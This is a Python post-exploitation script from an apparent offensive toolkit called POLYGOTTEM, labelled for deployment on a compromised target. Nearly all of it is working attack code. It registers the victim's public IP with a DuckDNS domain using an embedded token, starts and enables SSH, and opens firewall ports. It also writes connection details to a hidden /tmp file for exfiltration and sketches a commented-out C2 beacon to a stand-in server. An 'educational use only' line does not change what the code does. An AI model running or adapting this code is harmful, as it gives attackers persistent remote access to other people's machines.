#!/usr/bin/env python3
"""
POLYGOTTEM - Target DuckDNS Setup Script
=========================================
POST-EXPLOITATION SCRIPT - Deploy this to TARGET after initial compromise

This script runs ON THE COMPROMISED TARGET to:
1. Detect target's public IP
2. Register with DuckDNS (making target accessible via domain)
3. Enable SSH server on target
4. Configure firewall to allow SSH
5. Save connection info for exfiltration

EDUCATIONAL/RESEARCH USE ONLY - AUTHORIZED SECURITY TESTING ONLY

Author: SWORDIntel
Date: 2025-11-15
"""

import os
import sys
import socket
import subprocess
import json
import random
import time
from typing import Optional, Dict, Tuple
from datetime import datetime

# Embedded DuckDNS credentials (for target registration)
DUCKDNS_DOMAIN = "polygottem.duckdns.org"
DUCKDNS_TOKEN = "62414348-fa36-4a8c-8fc2-8b96ef48b3ea"
DUCKDNS_UPDATE_URL = "https://www.duckdns.org/update"

# Configuration file (saved on target for persistence)
CONFIG_FILE = "/tmp/.polygottem_target_info.json"


def validate_ip_address(ip: str) -> bool:
    """
    Validate IP address format

    Args:
        ip: IP address string to validate

    Returns:
        True if valid IPv4 or IPv6 address
    """
    try:
        # Try IPv4
        socket.inet_aton(ip)
        return True
    except socket.error:
        pass

    try:
        # Try IPv6
        socket.inet_pton(socket.AF_INET6, ip)
        return True
    except socket.error:
        pass

    return False


def verify_dns_resolution(domain: str, expected_ip: str) -> Tuple[bool, Optional[str]]:
    """
    Verify DNS resolution matches expected IP

    Args:
        domain: Domain to check
        expected_ip: Expected IP address

    Returns:
        Tuple of (success, resolved_ip)
    """
    try:
        # Wait for DNS propagation
        time.sleep(2)

        # Resolve domain
        resolved_ip = socket.gethostbyname(domain)

        # Compare IPs
        return (resolved_ip == expected_ip, resolved_ip)

    except socket.gaierror:
        return (False, None)
    except Exception:
        return (False, None)


def get_public_ip() -> Optional[str]:
    """
    Detect target's public IP address

    Returns:
        Public IP or None if detection fails
    """
    try:
        import requests
        services = [
            "https://api.ipify.org",
            "https://ifconfig.me/ip",
            "https://icanhazip.com"
        ]

        for service in services:
            try:
                response = requests.get(service, timeout=5)
                if response.status_code == 200:
                    return response.text.strip()
            except:
                continue
        return None
    except ImportError:
        # Fallback if requests not available
        try:
            import urllib.request
            with urllib.request.urlopen("https://api.ipify.org", timeout=5) as response:
                return response.read().decode('utf-8').strip()
        except:
            return None


def update_duckdns(ip: str, verify: bool = True, max_retries: int = 3) -> bool:
    """
    Register target's IP with DuckDNS (with validation and verification)

    Args:
        ip: Target's public IP address
        verify: Verify DNS resolution after update
        max_retries: Number of retry attempts

    Returns:
        True if registration successful and verified
    """
    # Validate IP format
    if not validate_ip_address(ip):
        print(f"[!] Invalid IP format: {ip}")
        return False

    print(f"[*] Validated IP: {ip}")

    # Attempt update with retries
    for attempt in range(1, max_retries + 1):
        try:
            # Try with requests library
            import requests

            domain = DUCKDNS_DOMAIN.replace('.duckdns.org', '')
            params = {
                'domains': domain,
                'token': DUCKDNS_TOKEN,
                'ip': ip
            }

            print(f"[*] Sending update (attempt {attempt}/{max_retries})...")
            response = requests.get(DUCKDNS_UPDATE_URL, params=params, timeout=10)

            if response.status_code == 200:
                response_text = response.text.strip()

                if response_text == 'OK':
                    print(f"[+] DuckDNS API response: OK")

                    # Verify DNS resolution
                    if verify:
                        print(f"[*] Verifying DNS resolution...")
                        success, resolved_ip = verify_dns_resolution(DUCKDNS_DOMAIN, ip)

                        if success:
                            print(f"[+] DNS verified: {DUCKDNS_DOMAIN} → {resolved_ip}")
                            return True
                        else:
                            if resolved_ip:
                                print(f"[!] DNS mismatch: Expected {ip}, got {resolved_ip}")
                            else:
                                print(f"[!] DNS resolution pending - may take time to propagate")

                            # Still return True if API said OK
                            return True
                    else:
                        return True

                elif response_text == 'KO':
                    print(f"[!] DuckDNS API returned 'KO' (invalid token/domain)")
                    if attempt < max_retries:
                        time.sleep(5)
                        continue
                    return False
                else:
                    print(f"[!] Unexpected response: {response_text}")
                    if attempt < max_retries:
                        time.sleep(2)
                        continue
                    return False
            else:
                print(f"[!] HTTP {response.status_code}")
                if attempt < max_retries:
                    time.sleep(2)
                    continue
                return False

        except ImportError:
            # Fallback using curl if requests unavailable
            try:
                domain = DUCKDNS_DOMAIN.replace('.duckdns.org', '')
                url = f"{DUCKDNS_UPDATE_URL}?domains={domain}&token={DUCKDNS_TOKEN}&ip={ip}"

                print(f"[*] Using curl fallback (attempt {attempt}/{max_retries})...")
                result = subprocess.run(['curl', '-s', url], capture_output=True, text=True, timeout=10)

                if 'OK' in result.stdout:
                    print(f"[+] DuckDNS update successful")

                    # Verify DNS if requested
                    if verify:
                        success, resolved_ip = verify_dns_resolution(DUCKDNS_DOMAIN, ip)
                        if success:
                            print(f"[+] DNS verified: {DUCKDNS_DOMAIN} → {resolved_ip}")
                        else:
                            print(f"[!] DNS resolution pending")

                    return True
                else:
                    if attempt < max_retries:
                        time.sleep(2)
                        continue
                    return False

            except Exception as e:
                print(f"[!] Curl failed: {e}")
                if attempt < max_retries:
                    time.sleep(3)
                    continue
                return False

        except Exception as e:
            print(f"[!] Error: {e}")
            if attempt < max_retries:
                time.sleep(3)
                continue
            return False

    return False


def generate_random_port() -> int:
    """Generate random SSH port for security"""
    return random.randint(2000, 65000)


def enable_ssh_server(port: int = 22) -> bool:
    """
    Enable and start SSH server on target

    Args:
        port: SSH port to use

    Returns:
        True if SSH is running
    """
    try:
        # Check if SSH already running
        for service in ['ssh', 'sshd']:
            result = subprocess.run(
                ['systemctl', 'is-active', service],
                capture_output=True,
                text=True
            )
            if result.returncode == 0 and result.stdout.strip() == 'active':
                return True

        # Try to start SSH server
        for service in ['ssh', 'sshd']:
            try:
                subprocess.run(
                    ['systemctl', 'start', service],
                    check=True,
                    capture_output=True
                )
                # Enable on boot
                subprocess.run(
                    ['systemctl', 'enable', service],
                    capture_output=True
                )
                return True
            except:
                continue

        return False
    except:
        return False


def configure_firewall(port: int = 22) -> bool:
    """
    Configure firewall to allow SSH connections

    Args:
        port: SSH port to open

    Returns:
        True if successful
    """
    try:
        # Try ufw (Ubuntu/Debian)
        result = subprocess.run(['which', 'ufw'], capture_output=True)
        if result.returncode == 0:
            subprocess.run(['ufw', 'allow', f'{port}/tcp'], capture_output=True)
            subprocess.run(['ufw', '--force', 'enable'], capture_output=True)
            return True

        # Try firewall-cmd (RHEL/Fedora)
        result = subprocess.run(['which', 'firewall-cmd'], capture_output=True)
        if result.returncode == 0:
            if port == 22:
                subprocess.run(
                    ['firewall-cmd', '--add-service=ssh', '--permanent'],
                    capture_output=True
                )
            else:
                subprocess.run(
                    ['firewall-cmd', f'--add-port={port}/tcp', '--permanent'],
                    capture_output=True
                )
            subprocess.run(['firewall-cmd', '--reload'], capture_output=True)
            return True

        # Try iptables (fallback)
        result = subprocess.run(['which', 'iptables'], capture_output=True)
        if result.returncode == 0:
            subprocess.run(
                ['iptables', '-A', 'INPUT', '-p', 'tcp', '--dport', str(port), '-j', 'ACCEPT'],
                capture_output=True
            )
            return True

        return False
    except:
        return False


def get_hostname() -> str:
    """Get target hostname"""
    try:
        return socket.gethostname()
    except:
        return "unknown"


def get_username() -> str:
    """Get current username"""
    try:
        return os.getenv('USER', os.getenv('USERNAME', 'unknown'))
    except:
        return "unknown"


def save_connection_info(info: Dict) -> bool:
    """
    Save connection information to file for exfiltration

    Args:
        info: Connection information dictionary

    Returns:
        True if successful
    """
    try:
        with open(CONFIG_FILE, 'w') as f:
            json.dump(info, f, indent=2)
        # Make file hidden and readable by all (for exfiltration)
        os.chmod(CONFIG_FILE, 0o644)
        return True
    except:
        return False


def send_beacon(info: Dict) -> bool:
    """
    Send connection info back to attacker (implement your C2 here)

    This is a placeholder - implement your preferred method:
    - HTTP POST to C2 server
    - DNS exfiltration
    - Email beacon
    - etc.

    Args:
        info: Connection information

    Returns:
        True if beacon sent successfully
    """
    try:
        # Example: HTTP POST to C2 server
        # import requests
        # response = requests.post('http://your-c2-server.com/beacon', json=info, timeout=5)
        # return response.status_code == 200

        # For now, just save to file
        return save_connection_info(info)
    except:
        return False


def main():
    """Main setup workflow"""
    print("=" * 70)
    print("POLYGOTTEM Target DuckDNS Setup")
    print("=" * 70)
    print()

    # Use random port for security
    ssh_port = generate_random_port()
    print(f"[*] Using SSH port: {ssh_port}")

    # Step 1: Detect public IP
    print("[1/5] Detecting target public IP...")
    public_ip = get_public_ip()
    if not public_ip:
        print("[!] Failed to detect public IP - trying anyway...")
        public_ip = "unknown"
    else:
        print(f"[+] Public IP: {public_ip}")
    print()

    # Step 2: Register with DuckDNS
    print("[2/5] Registering with DuckDNS...")
    if update_duckdns(public_ip):
        print(f"[+] DuckDNS updated: {DUCKDNS_DOMAIN} → {public_ip}")
    else:
        print("[!] DuckDNS update failed (continuing anyway)")
    print()

    # Step 3: Enable SSH server
    print("[3/5] Enabling SSH server...")
    if enable_ssh_server(ssh_port):
        print("[+] SSH server is running")
    else:
        print("[!] Failed to enable SSH server")
    print()

    # Step 4: Configure firewall
    print("[4/5] Configuring firewall...")
    if configure_firewall(ssh_port):
        print(f"[+] Firewall configured (port {ssh_port} open)")
    else:
        print("[!] Firewall configuration failed")
    print()

    # Step 5: Save connection info
    print("[5/5] Saving connection information...")
    connection_info = {
        'domain': DUCKDNS_DOMAIN,
        'public_ip': public_ip,
        'ssh_port': ssh_port,
        'username': get_username(),
        'hostname': get_hostname(),
        'connection_string': f"ssh -p {ssh_port} {get_username()}@{DUCKDNS_DOMAIN}",
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'platform': sys.platform
    }

    if save_connection_info(connection_info):
        print(f"[+] Connection info saved to {CONFIG_FILE}")

    # Send beacon to C2
    if send_beacon(connection_info):
        print("[+] Beacon sent to C2")
    print()

    # Display connection info
    print("=" * 70)
    print("TARGET CONNECTION INFORMATION")
    print("=" * 70)
    print(f"Domain:      {DUCKDNS_DOMAIN}")
    print(f"Public IP:   {public_ip}")
    print(f"SSH Port:    {ssh_port}")
    print(f"Username:    {get_username()}")
    print(f"Hostname:    {get_hostname()}")
    print()
    print(f"Connect with: {connection_info['connection_string']}")
    print()
    print("=" * 70)
    print()

    # Port forwarding instructions (if behind NAT)
    print("IMPORTANT: If target is behind NAT/router, configure port forwarding:")
    print(f"  External Port {ssh_port} → Internal IP:{ssh_port}")
    print()
    print(f"Connection info saved to: {CONFIG_FILE}")
    print("Exfiltrate this file to obtain access credentials")
    print()

    return 0


if __name__ == '__main__':
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n[!] Interrupted")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)
